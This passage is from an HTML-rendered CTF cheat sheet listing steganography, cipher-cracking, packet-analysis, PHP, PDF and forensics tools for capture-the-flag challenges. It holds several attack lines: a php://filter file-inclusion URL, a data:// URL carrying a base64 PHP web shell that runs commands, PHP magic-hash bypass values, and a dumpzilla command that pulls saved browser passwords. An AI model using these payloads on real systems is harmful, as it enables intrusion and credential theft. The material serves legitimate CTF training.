+<p>Don't ever forget about <a href="http://steghide.sourceforge.net/"><code>steghide</code></a>! This tool can use a password list like <code>rockyou.txt</code> with steghide. SOME IMAGES CAN HAVE MULTIPLE FILED ENCODED WITH MULTIPLE PASSWORDS.</p>
+</li>
+<li>
+<p><a href="http://stylesuxx.github.io/steganography/">Steganography Online</a></p>
+<p>A tool often used in CTFs for encoding messages into images.</p>
+</li>
+<li>
+<p><a href="https://github.com/RickdeJager/stegseek">StegSeek</a></p>
+<p>This is similar to <code>stegcracker</code>, but <em>much</em> faster. Can also extract metadata without a password list.</p>
+</li>
+<li>
+<p><a href="https://github.com/Va5c0/Steghide-Brute-Force-Tool"><code>steg_brute.py</code></a></p>
+<p>This is similar to <code>stegcracker</code> above.</p>
+</li>
+<li>
+<p><a href="https://www.openstego.com/"><code>openstego</code></a></p>
+<p>A <a href="https://en.wikipedia.org/wiki/Java_(programming_language)">Java</a> <a href="https://en.wikipedia.org/wiki/JAR_(file_format)"><code>.JAR</code></a> tool, that can extract data from an image. A good tool to use on guessing challenges, when you don't have any other leads. We found this tool after the <a href="http://0xahmed.ninja/nullcon-hackim18-ctf-writeups/">Misc50</a> challenge from <a href="https://ctftime.org/event/566">HackIM 2018</a></p>
+</li>
+<li>
+<p><a href="http://www.caesum.com/handbook/stego.htm"><code>Stegsolve.jar</code></a></p>
+<p>A <a href="https://en.wikipedia.org/wiki/Java_(programming_language)">Java</a> <a href="https://en.wikipedia.org/wiki/JAR_(file_format)"><code>.JAR</code></a> tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful.</p>
+</li>
+<li>
+<p><a href="http://steghide.sourceforge.net/"><code>steghide</code></a></p>
+<p>A command-line tool typically used alongside a password or key, that could be uncovered some other way when solving a challenge.</p>
+</li>
+<li>
+<p><a href="http://domnit.org/stepic/doc/"><code>stepic</code></a></p>
+<p>Python image steganography. Stepic hides arbitrary data inside PIL images. Download it here: http://domnit.org/stepic/doc/</p>
+</li>
+<li>
+<p><a href="http://diit.sourceforge.net/">Digital Invisible Ink Stego Tool</a></p>
+<p>A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit colour)</p>
+</li>
+</ul>
+<h1 id="when-given-a-file-to-work-with-do-not-forget-to-run-this-steghide-with-an-empty-password"><a class="header" href="#when-given-a-file-to-work-with-do-not-forget-to-run-this-steghide-with-an-empty-password">WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY PASSWORD!</a></h1>
+<ul>
+<li>
+<p><a href="https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml">ImageHide</a></p>
+<p>For PNG images (or BMP) images, there exists a Windows utility that can hide &quot;ENCRYPTED&quot; text within the LSB. If you also happen to have passwords, you can decrypt this and potentially find a flag. <a href="https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml">https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml</a></p>
+</li>
+<li>
+<p><a href="https://github.com/bannsec/stegoVeritas/">stegoVeritas</a></p>
+<p>Another steganography tool. A simple command-line tool and super easy to use -- definitely one to at least try.</p>
+</li>
+<li>
+<p>Unicode Steganography / Zero-Width Space Characters</p>
+<p>Some text that may be trying to hide something, in a seemingly innocent way, like &quot;Hmm, there may be something hiding here...&quot; may include zero-width characters. This is a utility that might help: <a href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a> ... Other options are just gross find and replace operations in Python IDLE.</p>
+</li>
+<li>
+<p>Online LSB Tools</p>
+<p>There are many online LSB tools that work in different ways. If you are given a file that you know is part of a Least Significant Bit challenge, try these tools:</p>
+<p><a href="https://manytools.org/hacker-tools/steganography-encode-text-into-image/">https://manytools.org/hacker-tools/steganography-encode-text-into-image/</a> Only supports PNG
+<a href="https://stylesuxx.github.io/steganography/">https://stylesuxx.github.io/steganography/</a></p>
+</li>
+<li>
+<p>Other stego tools:</p>
+<p><a href="https://github.com/DominicBreuker/stego-toolkit">https://github.com/DominicBreuker/stego-toolkit</a></p>
+</li>
+<li>
+<p><a href="https://github.com/zed-0xff/zsteg"><code>zsteg</code></a></p>
+<p>Command-line tool for use against Least Significant Bit steganography... unfortunately only works against PNG and BMP images.</p>
+</li>
+<li>
+<p><a href="https://github.com/lukechampine/jsteg"><code>jsteg</code></a></p>
+<p>Another command-line tool to use against JPEG images. <a href="https://github.com/lukechampine/jsteg">https://github.com/lukechampine/jsteg</a> Handy for Hackerrank Codefest CTF 2018.</p>
+</li>
+<li>
+<p><a href="https://sourceforge.net/projects/jstego/">Jstego</a></p>
+<p>A GUI tool for JPG steganography. <a href="https://sourceforge.net/projects/jstego/">https://sourceforge.net/projects/jstego/</a> It is a <a href="https://en.wikipedia.org/wiki/Java_(programming_language)">Java</a> <a href="https://en.wikipedia.org/wiki/JAR_(file_format)">JAR</a> file similar to stegsolve.jar</p>
+</li>
+<li>
+<p>Morse Code</p>
+<p>Always test for this if you are seeing two distinct values... <em>it may not always be binary!</em> Online decoders like so: <a href="https://morsecode.scphillips.com/translator.html">https://morsecode.scphillips.com/translator.html</a>. If you need to be case-sensistive or include a bit more stuff like numbers and punctuation, use this code: <a href="https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368">https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368</a></p>
+<p>If you find Morsecode in the &quot;international written form&quot;, like &quot;dah-dit-dit-dah&quot; etcetera, you can use this code: <a href="https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51">https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51</a> ... which was carved out of this resource: <a href="https://morsecode.scphillips.com/morse.html">https://morsecode.scphillips.com/morse.html</a></p>
+</li>
+<li>
+<p>Whitespace</p>
+<p>Tabs and spaces could be representing 1's and 0's and treating them as a binary message... or, they could be whitespace done with <a href="http://www.darkside.com.au/snow/"><code>snow</code></a> or an esoteric programming language interpreter: <a href="https://tio.run/#whitespace">https://tio.run/#whitespace</a></p>
+</li>
+<li>
+<p>Audio Speed Change (also change pitch)</p>
+</li>
+</ul>
+<pre><code>mplayer -af scaletempo -speed 64 flag.mp3
+</code></pre>
+<ul>
+<li>
+<p>DNA Codes</p>
+<p>When given a sequence with only A, C, G, T , there is an online mapping for these. Try this:</p>
+<p><img src="img/dna_codes.png" alt="img/dna_codes.png" />
+<img src="img/genome-coding.jpg" alt="img/genome_coding.jpg" /></p>
+</li>
+<li>
+<p>Extract Thumbnail (data is covered in original image)</p>
+<p>If you have an image where the data you need is covered, try viewing the thumbnail:</p>
+</li>
+</ul>
+<pre><code>exiftool -b -ThumbnailImage my_image.jpg &gt; my_thumbnail.jpg
+</code></pre>
+<ul>
+<li>
+<p><a href="http://www.darkside.com.au/snow/"><code>snow</code></a></p>
+<p>A command-line tool for whitespace steganography (see above).</p>
+</li>
+<li>
+<p>SONIC Visualizer (audio spectrum)</p>
+<p>Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you <a href="https://en.wikipedia.org/wiki/Spectrogram">spectrogram</a>. <strong>If it sounds like there is random bleeps and bloops in the sound, try this tactic!</strong></p>
+</li>
+<li>
+<p><a href="http://dialabc.com/sound/detect/index.html">Detect DTMF Tones</a></p>
+<p>Audio frequencies common to a phone button, DTMF: <a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling">https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling</a>.</p>
+</li>
+<li>
+<p>Phone-Keypad</p>
+<p>Some messages may be hidden with a string of numbers, but really be encoded with old cell-phone keypads, like text messaging with numbers repeated:</p>
+</li>
+</ul>
+<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov" alt="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov" /></p>
+<ul>
+<li>
+<p><a href="https://bitbucket.org/eliteraspberries/hipshot"><code>hipshot</code></a></p>
+<p>A <a href="https://www.python.org/">Python</a> module to compress a video into a single standalone image, simulating a long-exposure photograph. Was used to steal a <a href="https://en.wikipedia.org/wiki/QR_code">QR code</a> visible in a video, displayed through &quot;Star Wars&quot; style text motion.</p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/QR_code">QR code</a></p>
+<p>A small square &quot;barcode&quot; image that holds data.</p>
+</li>
+<li>
+<p><a href="https://linux.die.net/man/1/zbarimg"><code>zbarimg</code></a></p>
+<p>A command-line tool to quickly scan multiple forms of barcodes, <a href="https://en.wikipedia.org/wiki/QR_code">QR codes</a> included. Installed like so on a typical <a href="https://en.wikipedia.org/wiki/Ubuntu_(operating_system)">Ubuntu</a> image:</p>
+</li>
+</ul>
+<pre><code>sudo apt install zbar-tools
+</code></pre>
+<ul>
+<li>
+<p>Punctuation marks <code>!</code>, <code>.</code> and <code>?</code></p>
+<p>I have seen some challenges use just the end of <code>.</code> or <code>?</code> or <code>!</code> to represent the <a href="http://esolangs.org/wiki/ook!">Ook</a> esoteric programming language. Don't forget that is a thing!</p>
+</li>
+</ul>
+<h2 id="cryptography"><a class="header" href="#cryptography">Cryptography</a></h2>
+<ul>
+<li>
+<p>Cryptii</p>
+<p><a href="https://cryptii.com">https://cryptii.com</a> has multiple decoding tools like base64, Ceaser Cipher, ROT13, Vigenère Cipher and more.</p>
+</li>
+<li>
+<p>Keyboard Shift</p>
+<p><a href="https://www.dcode.fr/keyboard-shift-cipher">https://www.dcode.fr/keyboard-shift-cipher</a> If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...</p>
+</li>
+<li>
+<p>Bit Shift</p>
+<p>Sometimes the letters may be shifted by a stated hint, like a binary bit shift ( x &gt;&gt; 1 ) or ( x &lt;&lt; 1 ).</p>
+</li>
+<li>
+<p>Reversed Text</p>
+<p>Sometimes a &quot;ciphertext&quot; is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in <a href="https://www.python.org/">Python</a> like so:</p>
+</li>
+</ul>
+<pre><code>&quot;UOYMORFEDIHOTGNIYRTEBTHGIMFTCA.TAHTTERCESASISIHT&quot;[::-1]
+</code></pre>
+<ul>
+<li>
+<p>XOR</p>
+<p>ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in <code>\xde\xad\xbe\xef</code> etc..) Note that you can do easy XOR locally with Python like so (you need <code>pwntools</code> installed):</p>
+<pre><code class="language-python">python &gt;&gt;&gt; import pwn; pwn.xor(&quot;KEY&quot;, &quot;RAW_BINARY_CIPHER&quot;)
+</code></pre>
+</li>
+</ul>
+<h1 id="if-you-know-a-decent-crib-plaintext-use-cyberchef-to-help-determine-the-key"><a class="header" href="#if-you-know-a-decent-crib-plaintext-use-cyberchef-to-help-determine-the-key">IF YOU KNOW A DECENT CRIB (PLAINTEXT), USE CYBERCHEF TO HELP DETERMINE THE KEY</a></h1>
+<h1 id="do-not-forget-to-just-bruteforce-just-the-first-byte-or-two-bytes-or-three-bytes"><a class="header" href="#do-not-forget-to-just-bruteforce-just-the-first-byte-or-two-bytes-or-three-bytes">DO NOT FORGET TO JUST BRUTEFORCE JUST THE FIRST BYTE, OR TWO BYTES OR THREE BYTES.</a></h1>
+<ul>
+<li>
+<p>Caesar Cipher</p>
+<p>The most classic shift cipher. Tons of online tools like this: <a href="https://www.dcode.fr/caesar-cipher">https://www.dcode.fr/caesar-cipher</a> or use <code>caesar</code> as a command-line tool (<code>sudo apt install bsdgames</code>) and you can supply a key for it. Here's a one liner to try all letter positions:</p>
+<pre><code>cipher='jeoi{geiwev_gmtliv_ws_svmkmrep}' ; for i in {0..25}; do echo $cipher | caesar $i; done
+</code></pre>
+<p><strong>Be aware!</strong> Some challenges include punctuation in their shift! If this is the case, try to a shift within all 255 ASCII characters, not just 26 alphabetical letters!</p>
+</li>
+<li>
+<p><code>caesar</code></p>
+<p>A command-line caesar cipher tool (noted above) found in the <code>bsdgames</code> package.</p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Atbash">Atbash Cipher</a></p>
+<p>If you have some text that you have no idea what it is, try the <a href="https://en.wikipedia.org/wiki/Atbash">Atbash cipher</a>! It's a letter mapping, but the alphabet is reversed: like <code>A</code> maps to <code>Z</code>, <code>B</code> maps to <code>Y</code> and so on. There are tons of online tools to do this (<a href="http://rumkin.com/tools/cipher/atbash.php">http://rumkin.com/tools/cipher/atbash.php</a>), and you can build it with <a href="https://www.python.org/">Python</a>.</p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenere Cipher</a></p>
+<p><a href="http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</a>, <a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a> and personal Python code here: <a href="https://pastebin.com/2Vr29g6J">https://pastebin.com/2Vr29g6J</a></p>
+</li>
+<li>
+<p>Gronsfeld Cipher</p>
+<p>A variant of the Vignere cipher that uses numbers insteads of letters. <a href="http://rumkin.com/tools/cipher/gronsfeld.php">http://rumkin.com/tools/cipher/gronsfeld.php</a></p>
+</li>
+<li>
+<p>Beaufourt Cipher</p>
+<p><a href="https://www.dcode.fr/beaufort-cipher">https://www.dcode.fr/beaufort-cipher</a></p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Bacon%27s_cipher">Bacon Cipher</a></p>
+<p>A substitution cipher that replaces each character with five characters from a set of two (A and B is used most of the time). If we look at A as 0 and B as 1 it is a special encoding to binary numbers, where the character A has the value of binary <code>b00000</code>. Easy to recognize, because the ciphertext only contains two characters (e.g.: A and B) and the length of the ciphertext is divisible by 5. Example: <code>AAABB AAABA ABBAB AAABB AABAA AAAAB AAAAA AAABA ABBAB ABBAA</code>.</p>
+<pre><code>  [Online tool](http://rumkin.com/tools/cipher/baconian.php)
+</code></pre>
+</li>
+<li>
+<p>Python random module cracker/predictor</p>
+<p><a href="https://github.com/tna0y/Python-random-module-cracker">https://github.com/tna0y/Python-random-module-cracker</a>... helps attack the Mersenne Twister used in Python's random module.</p>
+</li>
+<li>
+<p>Transposition Cipher</p>
+</li>
+<li>
+<p>RSA: Classic RSA</p>
+<p>Variables typically given: <code>n</code>, <code>c</code>, <code>e</code>. <em>ALWAYS</em> try and give to <a href="http://factordb.com">http://factordb.com</a>. If <code>p</code> and <code>q</code> are able to be determined, use some RSA decryptor; handmade code available here: <a href="https://pastebin.com/ERAMhJ1v">https://pastebin.com/ERAMhJ1v</a></p>
+</li>
+<li>
+<p>RSA: Multi-prime RSA</p>
+<p>When you see multi-prime RSA, you can use calculate <code>phi</code> by still using all the factors.</p>
+</li>
+</ul>
+<pre><code>phi = (a - 1) * (b - 1) * (c - 1)    # ... etcetera
+</code></pre>
+<p><strong>If FactorDB cannot find factors, try alpertron: <a href="https://www.alpertron.com.ar/ECM.HTM">https://www.alpertron.com.ar/ECM.HTM</a></strong></p>
+<ul>
+<li>
+<p>RSA: <code>e</code> is 3 (or small)</p>
+<p>If <code>e</code> is 3, you can try the cubed-root attack. If you the cubed root of <code>c</code>, and if that is smaller than the cubed root of <code>n</code>, then your plaintext message <code>m</code> is just the cubed root of <code>c</code>! Here is <a href="https://www.python.org/">Python</a> code to take the cubed root:</p>
+</li>
+</ul>
+<pre><code>def root3rd(x):
+    y, y1 = None, 2
+    while y!=y1:
+        y = y1
+        y3 = y**3
+        d = (2*y3+x)
+        y1 = (y*(y3+2*x)+d//2)//d
+    return y
+</code></pre>
+<ul>
+<li>
+<p>RSA: Wiener's Little D Attack</p>
+<p>The telltale sign for this kind of challenge is an enormously large <code>e</code> value. Typically <code>e</code> is either 65537 (0x10001) or <code>3</code> (like for a Chinese Remainder Theorem challenge). Some stolen code available here: <a href="https://pastebin.com/VKjYsDqD">https://pastebin.com/VKjYsDqD</a></p>
+</li>
+<li>
+<p>RSA:  Boneh-Durfee Attack
+The tellgate sign for this kind of challenge is also an enormously large <code>e</code> value (<code>e</code> and <code>n</code> have similar size).
+Some code for this attack can be found <a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">here</a></p>
+</li>
+<li>
+<p>RSA: Chinese Remainder Attack</p>
+<p>These challenges can be spotted when given  mutiple <code>c</code> cipher texts and multiple <code>n</code> moduli. <code>e</code> must be the same number of given <code>c</code> and <code>n</code> pairs. Some handmade code here: <a href="https://pastebin.com/qypwc6wH">https://pastebin.com/qypwc6wH</a></p>
+</li>
+<li>
+<p><a href="https://www.schneier.com/blog/archives/2018/05/lc4_another_pen.html">LC4</a></p>
+<p>This is an adaptation of RC4... just not. There is an implementation available in Python.
+<a href="https://github.com/dstein64/LC4/blob/master/documentation.md">https://github.com/dstein64/LC4/blob/master/documentation.md</a></p>
+</li>
+<li>
+<p>Elgamal</p>
+</li>
+<li>
+<p>Affine Cipher</p>
+</li>
+<li>
+<p>Substitution Cipher (use quip quip!)</p>
+<p><a href="https://quipqiup.com/">https://quipqiup.com/</a></p>
+</li>
+<li>
+<p>Railfence Cipher</p>
+<p><a href="http://rumkin.com/tools/cipher/railfence.php">http://rumkin.com/tools/cipher/railfence.php</a></p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Playfair_cipher">Playfair Cipher</a></p>
+<p>racker: <a href="http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html">http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html</a></p>
+</li>
+<li>
+<p>Polybius Square</p>
+<p><a href="https://www.braingle.com/brainteasers/codes/polybius.php">https://www.braingle.com/brainteasers/codes/polybius.php</a></p>
+</li>
+<li>
+<p>The Engima</p>
+<p><a href="http://enigma.louisedade.co.uk/enigma.html">http://enigma.louisedade.co.uk/enigma.html</a>,
+<a href="https://www.dcode.fr/enigma-machine-cipher">https://www.dcode.fr/enigma-machine-cipher</a></p>
+</li>
+<li>
+<p>AES ECB</p>
+<p>The &quot;blind SQL&quot; of cryptography... leak the flag out by testing for characters just one byte away from the block length.</p>
+</li>
+<li>
+<p>Two-Time Pad</p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/International_Code_of_Signals">International Code of Signals Maritime</a></p>
+<p>First drafted by the British Board of Trade in 1855 and adopted as a world-wide standard on 1 January 1901. It is used for communications with ships, but also occasionally used by geocaching mystery caches (puzzle caches), CTFs and various logic puzzles. You may want to give a look at the tool <a href="https://www.dcode.fr/maritime-signals-code">maritime flags translator</a>.</p>
+</li>
+</ul>
+<p><img src="https://www.marvindisplay.com/images/SignalFlags.gif" alt="https://www.marvindisplay.com/images/SignalFlags.gif" /></p>
+<ul>
+<li>Daggers Cipher</li>
+</ul>
+<p>The daggers cipher is another silly text-to-image encoder. This is the key, and you can
+find a decoder on <a href="https://www.dcode.fr/daggers-alphabet">https://www.dcode.fr/daggers-alphabet</a>.</p>
+<p><img src="img/dagger_cipher.png" alt="img/dagger_cipher.png" /></p>
+<ul>
+<li>Hylian Language (Twilight Princess)</li>
+</ul>
+<p>The Hylian language is another silly text-to-image encoder. This is the key, and you can
+find a decoder on <a href="https://www.dcode.fr/hylian-language-twilight-princess">https://www.dcode.fr/hylian-language-twilight-princess</a>.</p>
+<p><img src="img/hylian.png" alt="img/hylian.png" /></p>
+<ul>
+<li>Hylian Language (Breath of the Wild)</li>
+</ul>
+<p>The Hylian language is another silly text-to-image encoder. This is the key, and you can
+find a decoder on <a href="https://www.dcode.fr/hylian-language-breath-of-the-wild">https://www.dcode.fr/hylian-language-breath-of-the-wild</a>.</p>
+<p><img src="img/botw.jpg" alt="img/botw.jpg" /></p>
+<ul>
+<li>Sheikah Language (Breathe of the Wild)</li>
+</ul>
+<p>The Sheikah language is another silly text-to-image encoder. This is the key, and you can
+find a decoder on <a href="https://www.dcode.fr/sheikah-language">https://www.dcode.fr/sheikah-language</a>.</p>
+<p><img src="img/sheikah.png" alt="img/sheikah.png" /></p>
+<ul>
+<li>Hexahue Alphabet </li>
+</ul>
+<p>The hexhue is an another tex-to-image enocder. you can find a decoder
+on <a href="https://www.boxentriq.com/code-breaking/hexahue">https://www.boxentriq.com/code-breaking/hexahue</a></p>
+<p><img src="img/hexahue-alphabet.png" alt="img" /></p>
+<h2 id="networking"><a class="header" href="#networking">Networking</a></h2>
+<ul>
+<li>
+<p><a href="https://www.wireshark.org/">Wireshark</a></p>
+<p>The go-to tool for examining <a href="https://en.wikipedia.org/wiki/Pcap"><code>.pcap</code></a> files.</p>
+</li>
+<li>
+<p><a href="http://www.netresec.com/?page=NetworkMiner">Network Miner</a></p>
+<p>Seriously cool tool that will try and scrape out images, files, credentials and other goods from <a href="https://en.wikipedia.org/wiki/Pcap">PCAP</a> and <a href="https://github.com/pcapng/pcapng">PCAPNG</a> files.</p>
+</li>
+<li>
+<p><a href="https://github.com/pcapng/pcapng">PCAPNG</a></p>
+<p>Not all tools like the <a href="https://github.com/pcapng/pcapng">PCAPNG</a> file format... so you can convert them with an online tool <a href="http://pcapng.com/">http://pcapng.com/</a> or from the command-line with the <code>editcap</code> command that comes with installing <a href="https://www.wireshark.org/">Wireshark</a>:</p>
+</li>
+</ul>
+<pre><code>editcap old_file.pcapng new_file.pcap
+</code></pre>
+<ul>
+<li>
+<p><a href="https://github.com/simsong/tcpflow"><code>tcpflow</code></a></p>
+<p>A command-line tool for reorganizing packets in a PCAP file and getting files out of them. <strong>Typically it gives no output, but it creates the files in your current directory!</strong></p>
+</li>
+</ul>
+<pre><code>tcpflow -r my_file.pcap
+ls -1t | head -5 # see the last 5 recently modified files
+</code></pre>
+<ul>
+<li>
+<p><a href="https://github.com/Srinivas11789/PcapXray">PcapXray</a></p>
+<p>A GUI tool to visualize network traffic.</p>
+</li>
+</ul>
+<h2 id="php"><a class="header" href="#php">PHP</a></h2>
+<ul>
+<li>
+<p>Magic Hashes</p>
+<p>A common vulnerability in <a href="https://en.wikipedia.org/wiki/PHP">PHP</a> that fakes hash &quot;collisions...&quot; where the <code>==</code> operator falls short in <a href="https://en.wikipedia.org/wiki/PHP">PHP</a> type comparison, thinking everything that follows <code>0e</code> is considered scientific notation (and therefore 0). More valuable info can be found here: <a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a>, but below are the most common breaks.</p>
+</li>
+</ul>
+<table><thead><tr><th>Plaintext</th><th>MD5 Hash</th></tr></thead><tbody>
+<tr><td>240610708</td><td>0e462097431906509019562988736854</td></tr>
+<tr><td>QLTHNDT</td><td>0e405967825401955372549139051580</td></tr>
+<tr><td>QNKCDZO</td><td>0e830400451993494058024219903391</td></tr>
+<tr><td>PJNPDWY</td><td>0e291529052894702774557631701704</td></tr>
+<tr><td>NWWKITQ</td><td>0e763082070976038347657360817689</td></tr>
+<tr><td>NOOPCJF</td><td>0e818888003657176127862245791911</td></tr>
+<tr><td>MMHUWUV</td><td>0e701732711630150438129209816536</td></tr>
+<tr><td>MAUXXQC</td><td>0e478478466848439040434801845361</td></tr>
+<tr><td>IHKFRNS</td><td>0e256160682445802696926137988570</td></tr>
+<tr><td>GZECLQZ</td><td>0e537612333747236407713628225676</td></tr>
+<tr><td>GGHMVOE</td><td>0e362766013028313274586933780773</td></tr>
+<tr><td>GEGHBXL</td><td>0e248776895502908863709684713578</td></tr>
+<tr><td>EEIZDOI</td><td>0e782601363539291779881938479162</td></tr>
+<tr><td>DYAXWCA</td><td>0e424759758842488633464374063001</td></tr>
+<tr><td>DQWRASX</td><td>0e742373665639232907775599582643</td></tr>
+<tr><td>BRTKUJZ</td><td>00e57640477961333848717747276704</td></tr>
+<tr><td>ABJIHVY</td><td>0e755264355178451322893275696586</td></tr>
+<tr><td>aaaXXAYW</td><td>0e540853622400160407992788832284</td></tr>
+<tr><td>aabg7XSs</td><td>0e087386482136013740957780965295</td></tr>
+<tr><td>aabC9RqS</td><td>0e041022518165728065344349536299</td></tr>
+<tr><td>0e215962017</td><td>0e291242476940776845150308577824</td></tr>
+</tbody></table>
+<table><thead><tr><th>Plaintext</th><th>SHA1 Hash</th></tr></thead><tbody>
+<tr><td>aaroZmOk</td><td>0e66507019969427134894567494305185566735</td></tr>
+<tr><td>aaK1STfY</td><td>0e76658526655756207688271159624026011393</td></tr>
+<tr><td>aaO8zKZF</td><td>0e89257456677279068558073954252716165668</td></tr>
+<tr><td>aa3OFF9m</td><td>0e36977786278517984959260394024281014729</td></tr>
+</tbody></table>
+<table><thead><tr><th>Plaintext</th><th>MD4 Hash</th></tr></thead><tbody>
+<tr><td>bhhkktQZ</td><td>0e949030067204812898914975918567</td></tr>
+<tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr>
+<tr><td>0e00000111222333333666788888889</td><td>0e641853458593358523155449768529</td></tr>
+<tr><td>0001235666666688888888888</td><td>0e832225036643258141969031181899</td></tr>
+</tbody></table>
+<ul>
+<li>
+<p><code>preg_replace</code></p>
+<p>A bug in older versions of <a href="https://en.wikipedia.org/wiki/PHP">PHP</a> where the user could get remote code execution</p>
+<p><a href="http://php.net/manual/en/function.preg-replace.php">http://php.net/manual/en/function.preg-replace.php</a></p>
+</li>
+<li>
+<p><a href="https://github.com/lighttpd/xcache/blob/master/bin/phpdc.phpr"><code>phpdc.phpr</code></a></p>
+<p>A command-line tool to decode <a href="http://php.net/manual/en/book.bcompiler.php"><code>bcompiler</code></a> compiled <a href="https://en.wikipedia.org/wiki/PHP">PHP</a> code.</p>
+</li>
+<li>
+<p><a href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/"><code>php://filter</code> for Local File Inclusion</a></p>
+<p>A bug in <a href="https://en.wikipedia.org/wiki/PHP">PHP</a> where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is <code>include</code>-ing other files to be served to the user. This can be manipulated by using <a href="http://php.net/manual/en/filters.php">PHP filters</a> to potentially retrieve source code. Example like so:</p>
+</li>
+</ul>
+<pre><code>http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+</code></pre>
+<ul>
+<li>
+<p><code>data://text/plain;base64</code></p>
+<p>A <a href="https://en.wikipedia.org/wiki/PHP">PHP</a> stream that can be taken advantage of if used and evaluated as an <code>include</code> resource or evaluated. Can be used for RCE: check out this writeup: <a href="https://ctftime.org/writeup/8868">https://ctftime.org/writeup/8868</a> ... TL;DR:</p>
+</li>
+</ul>
+<pre><code>http://103.5.112.91:1234/?cmd=whoami&amp;page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
+</code></pre>
+<h2 id="pdf-files"><a class="header" href="#pdf-files">PDF Files</a></h2>
+<ul>
+<li>
+<p><code>pdfinfo</code></p>
+<p>A command-line tool to get a basic synopsis of what the <a href="https://en.wikipedia.org/wiki/Portable_Document_Format">PDF</a> file is.</p>
+</li>
+<li>
+<p><code>pdfcrack</code></p>
+<p>A comand-line tool to <strong>recover a password from a PDF file.</strong> Supports dictionary wordlists and bruteforce.</p>
+</li>
+<li>
+<p><code>pdfimages</code></p>
+<p>A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.</p>
+</li>
+<li>
+<p><a href="https://www.systutorials.com/docs/linux/man/1-pdfdetach/"><code>pdfdetach</code></a></p>
+<p>A command-line tool to extract files out of a <a href="https://en.wikipedia.org/wiki/Portable_Document_Format">PDF</a>.</p>
+</li>
+</ul>
+<h2 id="forensics"><a class="header" href="#forensics">Forensics</a></h2>
+<ul>
+<li>
+<p>Python bytecode <code>uncompyle6</code></p>
+<p>To decompile bytecode, use <code>uncompyle6</code>. There is one special argument (I think <code>-d</code> or something???) that can have success if the default operation does not work. Do not give up hope when working with obvious Python bytecode. EasyPythonDecompiler might work, or perhaps testing with <code>uncompyle</code></p>
+</li>
+<li>
+<p>Keepass</p>
+<p><code>keepassx</code> can be installed on Ubuntu to open and explore Keepass databases. Keepass databases master passwords can be cracked with <code>keepass2john</code>.</p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files">Magic Numbers</a></p>
+<p>The starting values that identify a file format. These are often crucial for programs to properly read a certain file type, so they must be correct. If some files are acting strangely, try verifying their <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files">magic number</a> with a <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">trusted list of file signatures</a>.</p>
+</li>
+<li>
+<p><a href="https://hexed.it/"><code>hexed.it</code></a></p>
+<p>An online tool that allows you to modify the hexadecimal and binary values of an uploaded file. This is a good tool for correcting files with a corrupt <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files">magic number</a></p>
+</li>
+<li>
+<p><a href="http://www.dumpzilla.org/"><code>dumpzilla</code></a></p>
+<p>A <a href="https://www.python.org/">Python</a> script to examine a <code>.mozilla</code> configuration file, to examine downloads, bookmarks, history or bookmarks and registered passwords. Usage may be as such:</p>
+</li>
+</ul>
+<pre><code>python dumpzilla.py .mozilla/firefox/c3a958fk.default/ --Downloads --History --Bookmarks --Passwords
+</code></pre>
+<ul>
+<li>
+<p>Repair image online tool</p>
+<p>Good low-hanging fruit to throw any image at: <a href="https://online.officerecovery.com/pixrecovery/">https://online.officerecovery.com/pixrecovery/</a></p>
+</li>
+<li>
+<p><code>foremost</code></p>
+<p>A command-line tool to carve files out of another file. Usage is <code>foremost [filename]</code> and it will create an <code>output</code> directory.</p>
